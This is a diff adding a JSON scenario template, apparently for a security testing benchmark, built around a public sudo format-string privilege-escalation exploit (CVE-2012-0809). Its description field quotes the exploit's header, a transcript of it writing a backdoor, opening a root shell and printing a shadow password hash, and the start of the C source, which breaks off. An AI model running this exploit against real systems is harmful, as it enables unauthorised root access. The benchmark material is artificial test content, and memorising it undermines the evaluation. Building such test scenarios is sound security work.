@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_25134",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: sudo 1.8.0 < 1.8.3p1 - 'sudo_debug' glibc FORTIFY_SOURCE Bypass + Privilege Escalation (CVE-2012-0809;OSVDB-78659)\n\nExploit source code (25134.c):\n```\n/*\n death-star.c\n sudo v1.8.0-1.8.3p1 (sudo_debug) format string root exploit + glibc FORTIFY_SOURCE bypass\n by aeon - http://infosecabsurdity.wordpress.com/\n\n This PoC exploits:\n - CVE-2012-0864 - FORTIFY_SOURCE format string protection bypass via \"nargs\" integer overflow\n - CVE-2012-0809 - sudo v1.8.0-1.8.3p1 \"sudo_debug\" format string\n\n Tested on:\n - Fedora core 16 verne\n - glibc 2.14.90.14 release\n - sudo 1.8.1p2\n\n Notes:\n - This exploit actually turned out very reliable :-)\n - You can make a cleaner version of this exploit if you smash sudo_debug function pointer\n   or a libc function pointer so you dont write to disk. I wont be releasing that version :-)\n\n References and thanks too:\n - http://seclists.org/fulldisclosure/2012/Jan/att-590/advisory_sudo.txt\n - http://www.vnsecurity.net/2012/02/exploiting-sudo-format-string-vunerability/\n - http://www.alertlogic.com/modern-userland-linux-exploitation-courseware/\n - \"A Eulogy for Format Strings\" http://www.phrack.org/issues.html?issue=67&id=9&mode=txt\n\n[aeon@localhost tmp]$ gcc death-star.c -o death-star\n[aeon@localhost tmp]$ ./death-star\n[+] Targeting release: 3.1.0-7.fc16.i686.PAE\n[+] Found vuln glibc version: 2.14.90\n[+] Found a vuln sudo version: 1.8.1\n[+] Writing backdoor: e.c\n[+] Compiling backdoor: e\n[+] Writing SUDO_ASKPASS file: e.sh\n[+] Press enter when ready...\n\n< -------------- REMOVED -------------->\n\n                           A�\u001bAF\u0001@\u001fF\u0001@\u001fF\u0001@\u001fF\u0001@\u001fF\u0001@\u001f\u0002' from LD_PRELOAD cannot be preloaded: ignored.\n %1073825311%21372736 %: settings:\n=\n %1073825311%21372736 %: settings:\n=\n %1073825311%21372736 %: sudo_mode 1081383169\nSorry, try again.\nSorry, try again.\nSorry, try again.\n%20$08n %*482$ %*2850$ %1073741824$: 3 incorrect password attempts\n %1073886251%21372736 %: policy plugin returns 1081402445\n[+] Getting root..!\n[+] Cleaning system.\n[+] Launching root shell!\nsh-4.2# id; uname -a\nuid=0(root) gid=1001(aeon) groups=0(root),1001(aeon) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023\nLinux localhost.localdomain 3.1.0-7.fc16.i686.PAE #1 SMP Tue Nov 1 20:53:45 UTC 2011 i686 i686 i386 GNU/Linux\nsh-4.2# head -n1 /etc/shadow\nroot:$6$YxDB.SNvtnqhtt.T$slIOJSl7Lz07PtDF23m1G0evZH4MXvpo1VNebUUasM/je2sP6FXi2Y/QE1Ntg.93jOtTQOfZ8k2e/HhT8XzXN/:15818:0:99999:7:::\nsh-4.2#\n*/\n\n#include <sys/resource.h>\n#include <sys/utsname.h>\n#include <gnu/libc-version.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <sys/time.h>\n#include <sys/stat.h>\n#include <string.h>\n#include <sys/wait.h>\n\n#define OFFSET       65000\n#define NUM_THREADS  0\n\n/* files that we create on disk */\n#define BACKDOOR     \"e.c\"\n#define BD_COMPILED  \"e\"\n#define SUDO_ASKPASS \"e.sh\"\n\nextern char **environ;\nstruct utsname ver;\n\nvoid *kill_sudo();\nvoid *pop_shell();\nvoid *set_env();\nint is_glibc_vuln();\nint is_sudo_vuln();\nint write_backdoor();\n\n/* hardcoded path to sudo */\nconst char sudo[] = \"/usr/bin/sudo\\0\";\nchar s_version[20];\n\n/* vuln versions of sudo */\nchar vuln_sudo_versions[4][20] = {\n    {\"1.8.0\"},\n    \n```",
+  "cve": "CVE-2012-0809;OSVDB-78659",
+  "exploitdb_id": "25134",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_25134",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
